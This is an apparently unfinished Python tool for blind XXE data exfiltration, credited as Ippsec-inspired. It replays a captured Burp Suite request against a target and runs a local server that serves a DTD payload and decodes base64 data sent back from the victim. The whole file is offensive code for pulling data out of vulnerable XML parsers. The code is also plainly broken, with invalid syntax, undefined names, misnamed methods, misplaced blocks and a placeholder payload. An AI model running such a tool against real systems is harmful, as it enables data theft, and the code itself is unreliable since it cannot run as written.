import argparse
from threading import Thread
import http.server
import re
import requests
from base64 import b64decode
from cmd import Cmd

# Ippsec inspired
# From https://www.youtube.com/watch?v=Qn2GwH3vjs8 - Making blind XXE quicker and easier

# GIL Code provided by Ippsec

# Save file 

# Set a payload to be a global
payload = b'This would the payload IF IT EXISTED\n' 
endpoint = ''


def load_request_from_file(filename, ssl=False):
    with open(filename, 'r') as f:
        request_data = f.read()
        headers, body = request_data.replace('\r', '' ).split('\n\n')
    # Method, path, headers, body
    method = headers.split(' ')[0]
    path = headers.split(' ')[1]
    headers = dict([header.split(': ') for header in headers.split("\n")[1:]])
    path = f'http://{headers.["Host"]}{path}'
    if ssl:
         path = f'https://{headers.["Host"]}{path}'

    # Regex - fix for http
    re.search(r'SYSTEM "[https]*:\/\/(.*?)/', body)
    endpoint = search.group(1)
    return method, path, headers, body, endpoint

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/xml')
        self.end_header()
        if self.path.endswith('.dtd'):
            # If .dtd send payload (global variable)
            print("Sending payload")
            self.wfile.write(payload.encode())
            return
        elif self.path[:5] == '/b64/':
            # If the path is not .dtd - hope that b64 that server is responsing with
            try:
                data = b64decode(self.path[5:])
                print(data.decode())
            except Exception as e:
                print(e)
        else: 
            # Unexpected currently
            print(self.path)
            return

class Terminal(Cmd):
    prompt = 'xxe> '
    def default(self, args):
        global payload
        payload = b'Please Subscribe http!!! {endpoint}'
        method, path, headers, body, endpoint = load_request_from_file('xxe.req')
        r = requests.request(method, path, headers=headers, data=body)
        # r = requests.get('http://localhost:8000/'{}.format(args))
        print(r.text)


    def run():
        server_address = ('', 8000)
        httpd = http.server.HTTPServer(server_address, RequestHandler)
        http.server_forever()
    if __name__ == '__main__':
        parser =argparse.ArgumentParser(description='Ippsec\'s XXE Blind Injection Exfiltrator')
        parser.add_argument('-r', '--request', help='Burpsuite Request File', require=True)
        parser.add_argument('-s', '--ssl', help='Use SSL', action='store_true')
        args = parser.parse_args()
        global endpoint
        if args.ssl:
            method, path, header, body, endpoint = load_request_from_file(args.request, ssl=True)
        else:
             method, path, header, body, endpoint = load_request_from_file(args.request)
        # Start HTTP Server
        t = Thread(target=run)
        t.start()
        # Start Terminal
        terminal = Terminal()
        terminal.cmdloop()
